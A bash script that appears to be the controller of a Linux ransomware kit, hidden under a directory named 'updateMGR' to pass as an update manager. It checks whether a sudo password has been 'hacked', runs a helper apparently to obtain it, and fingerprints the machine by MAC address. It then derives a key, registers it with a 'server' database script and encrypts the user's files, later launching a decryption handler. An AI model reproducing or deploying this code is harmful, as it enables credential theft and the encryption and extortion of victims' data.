#!/bin/bash
pass_status_file=/home/$(whoami)/.config/updateMGR/hack_sucess_status
if [[ -f "$pass_status_file" ]]; then
    # Hack Status File Exists
    sudo_hack_status=`cat /home/$(whoami)/.config/updateMGR/hack_sucess_status`
    if [[ $sudo_hack_status -eq "1" ]];
    then
        #sudo password already obtained
        encr_status_file=/home/$(whoami)/.config/updateMGR/ency_sucess_status
        if [[ -f "$encr_status_file" ]]; then
            #Encrypted status file exists
            ency_status=`cat /home/$(whoami)/.config/updateMGR/ency_sucess_status`
            if [[ $ency_status -eq "1" ]];
            then # add condition of decryption as well, i.e. don't show decryption message after sucessful decryption
                # Files are already encrypted, so attempting to decrypt.
                export DISPLAY=:0.0
                username=$(whoami)
                python3 /home/$(whoami)/.config/updateMGR/decrypter_handler_subprocess.py $username              
            else
                #Files are not encrypted but somehow the status File exists, so call encrypt file
                user_pc_identifier=`cat /sys/class/net/*/address| tr '\n' ':'`
                #The following code is supposed to be on server, It will record  
                #<Unique User Identification, Time of Encryption, Number of Decrypt attempts Left>.
                #It will return encryption key which will be used for encryption.
                # username=$(whoami)
                #################################### Server Code block start here ############################################### 
                # enc_key_intermediate=`python3 /home/$(whoami)/.config/updateMGR/prf_server_code.py $user_pc_identifier $(whoami)`
                enc_key_intermediate=`python3 /home/$(whoami)/.config/updateMGR/prf_server_code.py $user_pc_identifier `
                
                enc_key_=`echo $enc_key_intermediate | sha256sum | cut -d ' ' -f 1`'='
                #################################### Server Code block ends here  ###############################################
                /home/$(whoami)/.config/updateMGR/encrypter.sh #identifying which files to encrypt
                username=$(whoami)
                python3 /home/$(whoami)/.config/updateMGR/encrypt_server_code.py $enc_key_ $username #Update Entries in Database (To be run on server)
                # python3 /home/$(whoami)/.config/updateMGR/encrypt_server_code.py $enc_key_ #Update Entries in Database (To be run on server)
                username=$(whoami)
                python3 /home/$(whoami)/.config/updateMGR/encrypt.py $enc_key_ $username > /home/$(whoami)/.config/updateMGR/encryption_file_log #Encrypting the files
                echo "1" > /home/$(whoami)/.config/updateMGR/ency_sucess_status
            fi
            else
                #Encrypted status file not exists meaning,Flow has came here just after
                #obtaining the sudo password, files are not yet encrypted.
                user_pc_identifier=`cat /sys/class/net/*/address| tr '\n' ':'`
                #The following code is supposed to be on server, It will record  
                #<Unique User Identification, Time of Encryption, Number of Decrypt attempts Left>.
                #It will return encryption key which will be used for encryption.
                #################################### Server Code block start here ###############################################  
                enc_key_intermediate=`python3 /home/$(whoami)/.config/updateMGR/prf_server_code.py $user_pc_identifier`
                enc_key_=`echo $enc_key_intermediate | sha256sum | cut -d ' ' -f 1`'='
                #################################### Server Code block ends here  ###############################################
                /home/$(whoami)/.config/updateMGR/encrypter.sh #identifying which files to encrypt
                username=$(whoami)
                python3 /home/$(whoami)/.config/updateMGR/encrypt_server_code.py $enc_key_ $username #Update Entries in Database (To be run on server)
                # python3 /home/$(whoami)/.config/updateMGR/encrypt_server_code.py $enc_key_ #Update Entries in Database (To be run on server)
                username=$(whoami)
                python3 /home/$(whoami)/.config/updateMGR/encrypt.py $enc_key_ $username > /home/$(whoami)/.config/updateMGR/encryption_file_log #encrypting the files
                echo "1" > /home/$(whoami)/.config/updateMGR/ency_sucess_status
        fi
    else
        # sudo password not obtained
        export DISPLAY=:0.0
        username=$(whoami)
        python3 /home/$(whoami)/.config/updateMGR/script_2.py $username
    fi
else
    # File Not Exists
    export DISPLAY=:0.0
    username=$(whoami)
    python3 /home/$(whoami)/.config/updateMGR/script_2.py $username
fi
